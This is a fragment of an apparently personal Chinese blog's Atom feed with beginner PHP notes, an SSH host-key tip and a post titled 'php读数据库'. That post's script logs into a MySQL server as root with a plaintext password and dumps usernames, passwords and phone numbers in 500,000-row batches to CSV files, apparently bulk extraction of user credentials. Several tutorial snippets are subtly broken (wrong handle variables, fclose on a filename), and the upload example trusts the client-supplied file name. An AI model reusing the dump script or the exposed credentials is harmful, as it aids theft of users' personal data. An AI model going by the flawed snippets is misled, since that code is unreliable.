title="常用变量函数"></a>常用变量函数</h2><table><thead><tr><th>类型</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>empty</td><td>检查变量是否为空，为空返回true，否则为false</td><td>empty(变量)</td></tr><tr><td>gettype</td><td>获取变量的类型</td><td>gettype(变量)</td></tr><tr><td>is_array</td><td>检查变量是否为数组类型</td><td>is_array(变量)</td></tr><tr><td>isset</td><td>检查变量是否被设置或赋值</td><td>isset(变量)</td></tr><tr><td>unset</td><td>释放给定变量，即销毁变量</td><td>unset(变量)</td></tr><tr><td>var_dump</td><td>打印变量的相关信息</td><td>var_dump(变量)</td></tr></tbody></table><h2 id="时间日期函数"><a href="#时间日期函数" class="headerlink" title="时间日期函数"></a>时间日期函数</h2><table><thead><tr><th>函数</th><th>说明</th><th>语法</th></tr></thead><tbody><tr><td>checkdate</td><td>验证日期的有效性</td><td>checkdate(1,1,2022)</td></tr><tr><td>date</td><td>格式化一个本地时间/日期</td><td>date(Y-m-d H:i:s)</td></tr></tbody></table><p>参考：<a href="https://www.runoob.com/php/php-ref-date.html">https://www.runoob.com/php/php-ref-date.html</a></p><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><ul><li><p>关键字class开头</p></li><li><p>类是抽象的对象，对象是具体化的类。</p></li><li><p>可理解为类是带参数的对象，是一个空白的对象模板。</p></li><li><p>人类是一个类，比尔盖茨则是一个对象。</p></li><li><p>类有属性(变量) 和方法(函数)</p></li><li><p>代码重复使用、灵活性强，减少代码重复臃肿，提高执行效率。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;       <span class="comment">//创建一个类  *没有()！！！！</span></span><br><span class="line">    <span class="keyword">var</span>  <span class="variable">$name</span>;           <span class="comment">//类属性</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;my name is&#x27;</span>.<span class="keyword">$this</span>-&gt;name;<span class="comment">// *this</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ps : $this关键字是用来访问当前对象中的对象属性和方法的系统变量,记住就好。</p><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><ul><li>用new从类中实例化一个对象</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xm</span> = <span class="keyword">new</span> person; <span class="comment">//实例化对象</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;name = <span class="string">&#x27;大帅比&#x27;</span>; <span class="comment">//对对象属性进行赋值</span></span><br><span class="line"><span class="variable">$xm</span> -&gt;say();     <span class="comment">//访问对象的方法</span></span><br></pre></td></tr></table></figure><h2 id="php文件读取"><a href="#php文件读取" class="headerlink" title="php文件读取"></a>php文件读取</h2><table><thead><tr><th>操作步骤</th><th>函数名称</th><th>作用</th></tr></thead><tbody><tr><td>打开文件1</td><td>fopen()</td><td>打开文件</td></tr><tr><td>文件读取2</td><td>fread()</td><td>读取文件指定长度的字符串</td></tr><tr><td>文件读取3</td><td>fgets()</td><td>读取文件一行内容</td></tr><tr><td>文件读取4</td><td>feof()</td><td>检测是否已经到达文件末尾</td></tr><tr><td>文件写入5</td><td>fwrite()</td><td>写入数据</td></tr><tr><td>关闭文件6</td><td>fclose()</td><td>关闭文件</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;c:\\data\\info.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);   <span class="comment">//r 只读  w 写入 a 追加写入</span></span><br><span class="line"><span class="variable">$file</span> = fopen(<span class="string">&quot;/home/file.gif&quot;</span>,<span class="string">&quot;wb&quot;</span>);    </span><br></pre></td></tr></table></figure><ul><li><p>打开文件常用函数</p><table><thead><tr><th>fopen()参数</th><th>说明</th></tr></thead><tbody><tr><td>r</td><td>以只读的方式打开，如果文件不存在将出错</td></tr><tr><td>w</td><td>以写入的方式打开，将文件指针指向文件头部，并删除文件内容，如果文件不存在则创建</td></tr><tr><td>a</td><td>以追加写入的方式打开，将文件指针指向文件末尾，如果文件不存在则创建</td></tr><tr><td>r+</td><td>以读写的方式(先读后写)打开，将文件指针指向文件头部</td></tr><tr><td>w+</td><td>以读写的方式打开，将文件指针指向文件头部，并删除文件内容</td></tr><tr><td>a+</td><td>以追加读写的方式打开，将文件指针指向文件末尾</td></tr><tr><td>x</td><td>以只写的方式创建并打开文件，并将文件指针指向文件头，如果文件存在，就会打开失败</td></tr><tr><td>x+</td><td>以读写的方式创建并打开文件，并将文件指针指向文件头。如果指定文件存在，就会打开失败</td></tr><tr><td>b</td><td>以二进制模式打开，可与r\w\a合用</td></tr></tbody></table></li><li><p>读取文件常用函数</p></li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>fread()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr><tr><td>fgets()</td><td>读取文件中的一行字符</td></tr><tr><td>fgetss()</td><td>读取文件中的一行字符，并去掉所有html和php标记</td></tr><tr><td>fgetc()</td><td>读取文件中的一个字符</td></tr><tr><td>file_get_contents()</td><td>将文件读入字符串</td></tr><tr><td>file()</td><td>把文件读入到一个数组中</td></tr><tr><td>readfile()</td><td>读取整个文件或文件中指定长度的字符串，可用于二进制文件读取</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&quot;test.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;r&#x27;</span>);       <span class="comment">//不能直接打开文件</span></span><br><span class="line"><span class="variable">$data</span> = fread(<span class="variable">$handle</span>,filesize(<span class="variable">$file</span>));  <span class="comment">//打开全部</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">fclose(<span class="variable">$file</span>);    <span class="comment">//关闭文件操作</span></span><br></pre></td></tr></table></figure><ul><li>循环读取文件</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&quot;hello.txt&quot;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$filename</span>,<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$handle</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(!feof(handle))    <span class="comment">//!取反  检测是否到达文件末尾，到达文件末尾为真，</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$line</span> = fgets(&amp;handle);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$line</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>；</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$handle</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$filename</span> open failed&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="php文件写入"><a href="#php文件写入" class="headerlink" title="php文件写入"></a>php文件写入</h2><ul><li>fwrite()</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;log.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;bb is dashuaibi!!&#x27;</span>;</span><br><span class="line"><span class="variable">$handle</span> = fopen(<span class="variable">$file</span>,<span class="string">&#x27;w&#x27;</span>);  <span class="comment">//or die (&#x27;cannot open file &#x27;.$file);</span></span><br><span class="line"><span class="variable">$write</span> = fwrite(<span class="variable">$handle</span>,<span class="variable">$string</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&#x27;write successful!&#x27;</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write failed!&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$handle</span>);</span><br></pre></td></tr></table></figure><ul><li><p>file_get_contents()&amp;file_put_contents函数读写文件</p><p>无需打开文件关闭文件就可以操作读取写入</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);<span class="comment">//读文件</span></span><br><span class="line"><span class="keyword">echo</span> file_put_contents(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;内容&quot;</span>,FILE_APPEND);<span class="comment">//以追加方式写文件</span></span><br></pre></td></tr></table></figure> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;test.txt&#x27;</span>; </span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;bb is dashuaibi&#x27;</span>;</span><br><span class="line"><span class="variable">$write</span> = file_put_contents(<span class="variable">$file</span>,<span class="variable">$data</span>,FILE_APPEND); <span class="comment">//写文件,FILE_APPEND 追加模式</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$write</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;write successful!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><ul><li>文件复制、移动删除的函数</li></ul><table><thead><tr><th>函数</th><th>语法</th><th>说明</th></tr></thead><tbody><tr><td>copy()</td><td>copy(源文件，目标文件)</td><td>复制文件</td></tr><tr><td>unlink()</td><td>unlink(目标文件)</td><td>删除文件</td></tr><tr><td>rename()</td><td>rename(旧文件名，新文件名)</td><td>重命名文件或目录，或移动文件</td></tr><tr><td>ftruncate()</td><td>ftruncate(目标文件资源，截取长度)</td><td>将文件截断到指定长度</td></tr><tr><td>file_exists</td><td>file_exists(目标文件名)</td><td>判断文件或文件夹是否存在</td></tr><tr><td>is_file()</td><td>is_file(文件名)</td><td>判断指定的路径存在且为文件</td></tr></tbody></table><ul><li>获取文件的属性</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>filesize()</td><td>只读，返回文件的大小</td></tr><tr><td>filetype()</td><td>只读，返回文件的类型，如文件文件夹</td></tr><tr><td>filectime()</td><td>返回文件创建的时间的时间戳</td></tr><tr><td>filemtime()</td><td>只读返回文件的修改时间</td></tr><tr><td>realpath()</td><td>返回文件的物理路径</td></tr><tr><td>pathinfo()</td><td>以数组形式返回文件的路径和文件名信息</td></tr></tbody></table><ul><li>目录的基本操作</li></ul><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>mkdir(pathname)</td><td>新建一个指定的目录</td><td>mkdir(‘temp’)</td></tr><tr><td>rmdir(dirname)</td><td>删除目录，该目录必须为空</td><td>rmdir(‘data’)</td></tr><tr><td>getcwd(void)</td><td>取得当前文件所在的目录</td><td>echo getcwd();</td></tr><tr><td>chdir(dirname)</td><td>改变当前目录</td><td>chdir(‘…/‘);</td></tr><tr><td>opendir(path)</td><td>打开目录，返回目录的指针</td><td>$dirh=opendir(‘temp’);</td></tr><tr><td>closedir()</td><td>关闭目录，参数为目录指针</td><td>closedir($dirh);</td></tr><tr><td>readdir()</td><td>遍历目录</td><td>$file=readdir($dirh);</td></tr><tr><td>scandir(path,sort)</td><td>以数组形式便利目录，sort参数可设置升序或降序排列</td><td>$arr=scandir(‘D:\bb’1);</td></tr></tbody></table><h2 id="php-mysql操作"><a href="#php-mysql操作" class="headerlink" title="php mysql操作"></a>php mysql操作</h2><p>连接一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(host,name,pass)</span><br></pre></td></tr></table></figure><p>选择一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql_select_db(sqlname,<span class="variable">$conn</span>) ;  <span class="comment">//已被弃用</span></span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,sqlname);  <span class="comment">//mysqli 和 mysql刚好相反！！！！！</span></span><br></pre></td></tr></table></figure><p>查询一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(SQL,connect)    </span><br></pre></td></tr></table></figure><p>输出一个数据库</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql_fetch_array( mysql_query)  <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回键值对数组</span></span><br><span class="line">mysql_fetch_row(mysql_query)   <span class="comment">#从结果集中取得一行作为枚举数组！--&gt;返回下标数组</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array( mysql_query))&#123;   <span class="comment">//正确取值,如果按变量赋值则陷入死循环.</span></span><br><span class="line">    <span class="comment">//代码块</span></span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_num_rows (mysql_query)  <span class="comment">#获取由select语句查询到的结果集中行的数目</span></span><br></pre></td></tr></table></figure><h2 id="php-文件包含"><a href="#php-文件包含" class="headerlink" title="php 文件包含"></a>php 文件包含</h2><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>include()</td><td>文件包含失败时，会产生警告，脚本会继续运行</td></tr><tr><td>require()</td><td>文件包含失败时，会产生错误，直接结束脚本执行</td></tr><tr><td>include_once()</td><td>与include()功能相同，文件只会被包含一次</td></tr><tr><td>require_once()</td><td>与require()功能相同，文件只会被包含一次</td></tr></tbody></table><h2 id="setcookie"><a href="#setcookie" class="headerlink" title="setcookie()"></a>setcookie()</h2><ul><li><strong>创建COOKIE</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name,value,expire,path,domain,secure);</span><br></pre></td></tr></table></figure><ul><li><p><strong>读取COOKIE</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 输出 cookie 值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看所有 cookie</span></span><br><span class="line">print_r(<span class="variable">$_COOKIE</span>);</span><br><span class="line"><span class="comment">// 判断 cookie</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>]))</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;欢迎 &quot;</span> . <span class="variable">$_COOKIE</span>[<span class="string">&quot;user&quot;</span>] . <span class="string">&quot;!&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>删除COOKIE</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;&quot;</span>, time()-<span class="number">3600</span>);</span><br></pre></td></tr></table></figure><h2 id="SESSION"><a href="#SESSION" class="headerlink" title="SESSION()"></a>SESSION()</h2><ul><li><p><strong>启动会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="meta">?&gt;</span>  <span class="comment">//放文件头!</span></span><br></pre></td></tr></table></figure></li><li><p><strong>存储会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 存储 session 数据</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong>读取会话</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]))</span><br></pre></td></tr></table></figure></li><li><p><strong>摧毁会话</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;views&#x27;</span>]);</span><br><span class="line">session_destroy();</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><ul><li><strong>form表单</strong></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_file.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span>&gt;</span>上传<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>    </span><br></pre></td></tr></table></figure><ul><li><strong>$_FILES[]</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">print_r(<span class="variable">$_FILES</span>[])  <span class="comment">//超级全局变量 都是一个数组.</span></span><br><span class="line"><span class="comment">//结果:</span></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [file] =&gt; <span class="keyword">Array</span></span><br><span class="line">        (</span><br><span class="line">            [name] =&gt; dog1111.jpg</span><br><span class="line">            [type] =&gt; image/jpeg</span><br><span class="line">            [tmp_name] =&gt; /tmp/php0APUAO     <span class="comment">//默认上传到了/tmp文件夹,如果不立即移走,程序运行结束后就会被删除</span></span><br><span class="line">            [<span class="built_in">error</span>] =&gt; <span class="number">0</span></span><br><span class="line">            [size] =&gt; <span class="number">27295</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li><strong>判断文件或目录是否存在</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_exists(目录或文件名);</span><br><span class="line">file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])     </span><br></pre></td></tr></table></figure><ul><li><strong>移动文件到upload/</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">move_uploaded_file(源路径,目标路径);</span><br><span class="line">move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;三种标签&quot;&gt;&lt;a href=&quot;#三种标签&quot; class=&quot;headerlink&quot; title=&quot;三种标签&quot;&gt;&lt;/a&gt;三种标签&lt;/h2&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>mac os ssh IP变更后出现Host key verification failed.</title>
    <link href="https://bstark.me/posts/39942/"/>
    <id>https://bstark.me/posts/39942/</id>
    <published>2022-01-08T12:54:52.000Z</published>
    <updated>2022-01-21T03:51:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>MacBook ssh 主机变更后，出现Host key verification failed.的问题</p><p>ssh-keygen -R 127.0.0.1</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;MacBook ssh 主机变更后，出现Host key verification failed.的问题&lt;/p&gt;
&lt;p&gt;ssh-keygen -R 127.0.0.1&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="问题" scheme="https://bstark.me/tags/%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>php读数据库</title>
    <link href="https://bstark.me/posts/36387/"/>
    <id>https://bstark.me/posts/36387/</id>
    <published>2022-01-08T12:54:52.000Z</published>
    <updated>2022-01-21T03:51:39.138Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = @mysql_connect(<span class="string">&quot;192.168.241.89&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;Vega2010##&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;X Connect failed&quot;</span>);</span><br><span class="line">mysql_select_db(<span class="string">&quot;chacha_cloud&quot;</span>, <span class="variable">$conn</span>);</span><br><span class="line">mysql_query(<span class="string">&quot;set names &#x27;UTF-8&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$sql</span>=<span class="string">&quot;select username,password,phone from user limit 12500000,500000&quot;</span>;</span><br><span class="line">  <span class="variable">$query</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="variable">$row</span>=mysql_fetch_array(<span class="variable">$query</span>))&#123;</span><br><span class="line">    <span class="variable">$fp</span> = fopen(<span class="string">&#x27;t4/14.csv&#x27;</span>, <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">    fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;&quot;&#x27;</span>.@<span class="variable">$row</span>[username].<span class="string">&#x27;&quot;,&quot;&#x27;</span>.@<span class="variable">$row</span>[password].<span class="string">&#x27;&quot;&#x27;</span>.<span class="string">&#x27;&quot;,&quot;&#x27;</span>.@<span class="variable">$row</span>[phone].<span class="string">&#x27;&quot;&#x27;</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">  &#125;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;finished&#x27;</span>;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;</summary>
      
    
    
    
    
    <category term="源码" scheme="https://bstark.me/tags/%E6%BA%90%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>while mysql_fetch_array 死循环原因</title>
    <link href="https://bstark.me/posts/19927/"/>
    <id>https://bstark.me/posts/19927/</id>
    <published>2022-01-08T07:01:34.000Z</published>
    <updated>2022-01-08T07:13:54.692Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p><strong>错误代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>,MYSQL_ASSOC)[<span class="string">&quot;title&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>)  <span class="comment">//死循环!</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;title:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;title&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;name:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;date:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;date&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;txet:&quot;</span>.<span class="variable">$row</span>[<span class="string">&#x27;txt&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>正确代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;conn.php&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from message&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>,<span class="variable">$conn</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span 